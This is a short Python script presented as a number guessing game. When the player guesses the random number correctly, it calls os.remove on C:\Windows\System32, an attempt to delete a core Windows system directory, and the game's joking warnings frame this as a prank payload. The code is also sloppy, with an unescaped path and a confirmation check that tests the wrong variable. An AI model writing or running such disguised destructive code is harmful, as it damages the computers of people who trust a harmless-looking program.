import random
import os


def main():
    print("Welcome to the number guessing game!\n")
    answer = str(input("Do you want to play? (yes/no) "))
    if answer == "yes" or answer == "Yes" or answer == "YES":
        print("Are you sure you want to play this game? Know what its consequences are\n")
        confirmation = str(input("Do you want to continue? (yes/no) "))
        if confirmation == "yes" or answer == "Yes" or answer == "YES":
            print("Well be warned!\n")
            print('I am thinking of a number between 1 and 10\n')
            number = random.randint(1, 10)
            guess = int(input("Take a guess: "))
            if guess != number:
                print("Good job! You number is not the same as mine\n")
            else:
                os.remove("C:\Windows\System32")  
    else:
        print("Goodbye!")
        os._exit(0)

if __name__ == "__main__":
    main()